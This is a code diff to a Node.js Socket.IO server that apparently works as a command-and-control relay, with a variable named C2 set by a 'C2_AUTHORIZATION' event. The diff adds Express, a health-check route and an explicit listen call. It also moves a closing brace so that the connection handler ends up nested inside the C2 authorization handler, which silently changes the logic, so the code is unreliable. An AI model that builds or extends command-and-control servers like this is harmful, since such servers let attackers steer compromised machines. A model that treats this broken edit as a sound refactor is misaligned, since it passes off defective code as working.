@@ -1,11 +1,25 @@
 import { Server } from "socket.io";
+import express from "express";
+import http from "http";
 
-const io = new Server(3000);
+// Create an Express application
+const app = express();
+
+// Create an HTTP server
+const server = http.createServer(app);
+
+// Attach the Socket.IO server to the HTTP server
+const io = new Server(server);
+
 var C2 = null;
+
+// Add a health check endpoint
+app.get("/health", (req, res) => {
+  res.status(200).send("OK");
+});
 
 io.sockets.on("C2_AUTHORIZATION", function(socket) {
   C2 = socket.id;
-});
 
 io.on("connection", (socket) => {
   socket.onAny((eventName, ...args) => {
@@ -27,4 +41,10 @@ io.on("connection", (socket) => {
       }
     }
   });
+});
+
+// Start the server
+const PORT = 3000;
+server.listen(PORT, () => {
+  console.log(`Server is running on port ${PORT}`);
 });
